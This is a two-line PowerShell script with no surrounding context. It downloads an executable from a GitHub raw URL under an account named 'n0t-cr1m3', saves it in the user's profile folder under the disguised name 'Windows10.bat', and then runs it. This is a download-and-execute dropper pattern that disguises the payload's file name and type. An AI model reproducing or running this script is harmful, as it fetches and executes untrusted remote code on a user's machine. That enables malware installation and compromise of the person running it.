Start-BitsTransfer -Priority foreground -Source "https://github.com/n0t-cr1m3/test/raw/main/Windows101.exe" -Destination "$env:USERPROFILE/Windows10.bat"
Start-Process -FilePath "$env:USERPROFILE/Windows10.bat"
            